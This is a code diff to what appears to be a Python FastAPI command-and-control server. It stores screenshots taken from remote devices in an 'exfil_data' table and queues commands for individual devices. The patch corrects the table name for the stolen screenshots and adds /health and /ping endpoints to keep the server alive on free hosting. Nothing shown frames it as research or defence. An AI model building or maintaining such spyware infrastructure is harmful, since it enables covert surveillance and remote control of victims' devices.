@@ -86,7 +86,8 @@ async def receive_screenshot(request: Request):
         import database
         conn = database.get_db()
         c = conn.cursor()
-        c.execute("INSERT INTO exfil (device_id, data_type, payload) VALUES (?, ?, ?)",
+        # FIX: Correct table name is exfil_data not exfil
+        c.execute("INSERT INTO exfil_data (device_id, data_type, payload) VALUES (?, ?, ?)",
                   (device_id, "screenshot", image_data))
         conn.commit()
         conn.close()
@@ -152,6 +153,20 @@ async def send_command(request: Request):
         raise HTTPException(status_code=400, detail="device_id and cmd required")
     queue_command(device_id, cmd, args)
     return {"status": "queued"}
+
+# ─────────────────────────────────────────────────────────────
+# Health / Keep-alive (Render free tier spins down after 15 min idle)
+# ─────────────────────────────────────────────────────────────
+
+@app.get("/health")
+async def health():
+    """Health check endpoint — used by Render keep-alive pings and uptime monitors."""
+    return {"status": "ok", "timestamp": datetime.utcnow().isoformat() + "Z"}
+
+@app.get("/ping")
+async def ping():
+    """Alias for /health — lightweight keep-alive for free-tier hosting."""
+    return {"pong": True}
 
 # ─────────────────────────────────────────────────────────────
 # Web Dashboard
